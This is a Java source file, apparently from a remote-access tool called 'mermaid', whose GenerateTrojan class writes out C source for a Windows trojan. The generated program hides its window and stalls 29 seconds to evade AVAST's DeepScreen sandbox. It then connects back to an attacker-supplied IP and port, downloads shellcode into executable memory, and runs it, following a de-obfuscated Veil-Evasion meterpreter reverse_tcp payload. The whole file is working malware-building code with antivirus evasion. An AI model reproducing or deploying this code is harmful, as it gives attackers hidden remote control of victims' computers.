package net.jlxip.mermaid;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class GenerateTrojan {
    public static void generate(File trojan, String IP, String PORT){     // FUNCIÓN PARA GENERAR EL EXPLOIT
        try{
        	FileWriter FWwriter = new FileWriter(trojan);
            PrintWriter writer = new PrintWriter(FWwriter);	// Abrimos el archivo recibido por argumentos para escribir en él
            // ESCRIBIMOS EL EXPLOIT
            // CORTESÍA DE VEIL-EVASION ( https://goo.gl/BF0evF )
            // ME TIRÉ UN PUTO DÍA DE-OFUSCANDO EL CÓDIGO DE SU PAYLOAD "c/meterpreter/reverse_tcp"
            writer.println("#define _WIN32_WINNT 0x0500");  // Establecemos _WIN32_WINNT a 0X0500 para poder ocultar la ventana
            writer.println("#include <winsock2.h>");    // Incluímos la librería "winsock2.h"
            writer.println("#include <stdio.h>");       // Incluímos la librería "stdio.h"
            writer.println("#include <string.h>");      // Incluímos la librería "string.h"
            writer.println("#include <stdlib.h>");      // Incluímos la librería "stdlib.h"
            writer.println("#include <time.h>");        // Incluímos la librería "time.h"
            writer.println("#include <windows.h>");     // Incluímos la librería "windows.h"
            writer.println("void CloseSocketError(SOCKET recvSocket) {");   // Función para cerrar el programa si falla algo (¡Borra las pruebas, Jhonny!)
            writer.println("	closesocket(recvSocket);");   // Cerramos el socket recibido por argumentos
            writer.println("	WSACleanup();");      // Limpiamos el WSA
            writer.println("	exit(1);");       // Salimos marcando que ha habido un error
            writer.println("}");
            writer.println("main() {");     // Función Main
            writer.println("	ShowWindow( GetConsoleWindow(), SW_HIDE );");     // Ocultamos la ventana
            writer.println("	int retTime = time(0) + 29;");    // Esperamos 29 segundos (antes eran 30, pero se convirtió en un patrón detectado) para evitarnos el DeepScreen de AVAST y similares...
            writer.println("	while(time(0)<retTime);");        // Mientras no haya acabado el tiempo, no hace nada.
            
            writer.println("      char* IP = \""+IP+"\";");   // Creamos una cadena de carácteres con la IP/DNS elegida en el perfil
            writer.println("      int PORT = "+PORT+";");     // Creamos una variable entera con el puerto
            
            writer.println("	ULONG32 length;");    // Creamos una variable ULONG32 con la longitud
            writer.println("	char * shellcode;");  // Creamos una cadena de carácteres para almacenar posteriormente el shellcode
            writer.println("	WORD wVersionRequested = MAKEWORD(2, 2);");   // Creamos una variable WORD con la versión de SOCKET necesaria
            writer.println("	WSADATA wsaData;");   // Creamos un nuevo WSADATA
            writer.println("	if (WSAStartup(wVersionRequested, &wsaData) < 0) {"); // Si la versión no es la requerida...
            writer.println("		WSACleanup();");  // Limpiamos el WSA
            writer.println("		exit(1);");       // Cerramos marcando que ha ocurrido un error
            writer.println("	}");
            writer.println("	struct hostent * ConnectionSocket_HOST;");    // Creamos una variable con el HOST remoto
            writer.println("	struct sockaddr_in ConnectionSocket_PORT;");  // Creamos una variable con el puerto remoto
            writer.println("	SOCKET ConnectionSocket;");   // Creamos un nuevo socket
            writer.println("	ConnectionSocket = socket(AF_INET, SOCK_STREAM, 0);");    // Lo inicializamos
            writer.println("	if (ConnectionSocket == INVALID_SOCKET){");   // Si es inválido...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	ConnectionSocket_HOST = gethostbyname(IP);"); // Obtenemos el HOST mediante el nombre de dominio
            writer.println("	if (ConnectionSocket_HOST == NULL){");    // Si no se puede resolver IP/DNS
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos de nuevo a CloseSocketError
            writer.println("	}");
            writer.println("	memcpy(&ConnectionSocket_PORT.sin_addr.s_addr, ConnectionSocket_HOST->h_addr, ConnectionSocket_HOST->h_length);");    // Establecemos el HOST en el socket (creo, en realidad no tengo ni idea de qué ocurre). Perdón de nuevo :S
            writer.println("	ConnectionSocket_PORT.sin_family = AF_INET;");    // Ponemos el tipo de conexión
            writer.println("	ConnectionSocket_PORT.sin_port = htons(PORT);");  // Establecemos el puerto
            writer.println("	if ( connect(ConnectionSocket, (struct sockaddr *)&ConnectionSocket_PORT, sizeof(ConnectionSocket_PORT)) ){");    // Si ocurre algún error...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	int received = recv(ConnectionSocket, (char *)&length, 4, 0);");  // Recibimos una "confirmación"
            writer.println("	if (received != 4 || length <= 0){"); // Si lo recibido es distinto a 4 o menor que 0...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	shellcode = VirtualAlloc(0, length+5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);"); // Preparamos la variable para almacenar el shellcode
            writer.println("	if (shellcode == NULL){");    // Si después de lo de arriba, se encuentra nula...
            writer.println("		CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("	}");
            writer.println("	shellcode[0] = 0xBF;");   // Escribimos el primer byte de la shellcode
            writer.println("	memcpy(shellcode + 1, &ConnectionSocket, 4);");   // Copiamos la shellcode
            writer.println("	int lastByte=0;");    // Creamos una variable entera con el último byte leído
            writer.println("	int currentByte=0;"); // Creamos una variable entera con el byte actual
            writer.println("	void * startb = shellcode + 5;"); // Guardamos el byte inicial de la shellcode
            writer.println("	while (currentByte < length) {"); // Mientras el byte actual sea menor al tamaño... (recorremos)
            writer.println("		lastByte = recv(ConnectionSocket, (char *)startb, length - currentByte, 0);");    // Establecemos el último byte a uno recibido
            writer.println("		startb += lastByte;");    // Sumamos el último byte al byte inicial
            writer.println("		currentByte += lastByte;");   // Sumamos el último byte al byte actual
            writer.println("		if (lastByte == SOCKET_ERROR) {");    // Si el último byte contiene un error de socket
            writer.println("			CloseSocketError(ConnectionSocket);");    // Recurrimos a CloseSocketError
            writer.println("		}");
            writer.println("	}");
            writer.println("	void (*LaunchShellcode)() = (void(*)())shellcode;");  // Preparamos el método para lanzar la shellcode
            writer.println("	LaunchShellcode();"); // Y por último... ¡Lanzamos la shellcode!
            writer.println("	return 0;");  // Cuando finalize la shellcode (probablemente por un cierre en el cliente) cerramos el exploit
            writer.println("}");
            writer.close(); // Cerramos el archivo
            FWwriter.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
